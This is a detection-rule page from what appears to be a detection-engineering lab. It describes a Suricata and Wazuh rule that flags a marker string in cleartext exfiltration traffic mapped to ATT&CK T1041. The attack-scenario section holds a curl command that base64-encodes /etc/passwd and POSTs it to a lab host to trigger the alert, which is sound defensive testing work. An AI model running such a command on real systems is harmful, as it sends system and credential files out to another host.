# T1041 — Cleartext exfil marker on the wire

| | |
|---|---|
| **ATT&CK** | [T1041](https://attack.mitre.org/techniques/T1041/) |
| **Tactic** | Exfiltration |
| **Severity** | high |
| **Engine** | Wazuh (Suricata) → rule `100611` |
| **Automated test** | ✅ attack replayed + alert asserted in CI |

## What it detects

Detects a distinctive marker string in cleartext TCP traffic, standing in for data being exfiltrated over the C2 channel. Custom Suricata signature, the same content-match approach as the T1071.001 beacon detection.

## Detection logic

```yaml
selection:
  alert.signature: DLL Exfil Marker
condition: selection
```

Suricata (network IDS, sharing `target-linux`'s network namespace) matches a custom signature in [`compose/suricata/dll.rules`](https://github.com/MhdFadlyy/detection-lab-lite/blob/main/compose/suricata/dll.rules) and writes EVE JSON to a shared volume; the `target-linux` agent tails it, and rule `100611` in [`0600-suricata.xml`](https://github.com/MhdFadlyy/detection-lab-lite/blob/main/detections/wazuh-native/0600-suricata.xml) matches on `alert.signature`.

## Attack scenario — `./lab attack T1041`

*Send file contents out over the C2 channel with a distinctive marker*

```bash
curl -s --max-time 3 -X POST -d "DLL_EXFIL_MARKER=$(base64 -w0 /etc/passwd)" \
  "http://cowrie:2222/upload" || true
```

`./lab verify T1041` then asserts the alert reached the indexer.

## Known false positives

- None expected — the marker string is unique to this lab's scenario

## References

- <https://attack.mitre.org/techniques/T1041/>

---

*Source: [`detections/exfiltration/T1041_http_exfil.yml`](https://github.com/MhdFadlyy/detection-lab-lite/blob/main/detections/exfiltration/T1041_http_exfil.yml)*
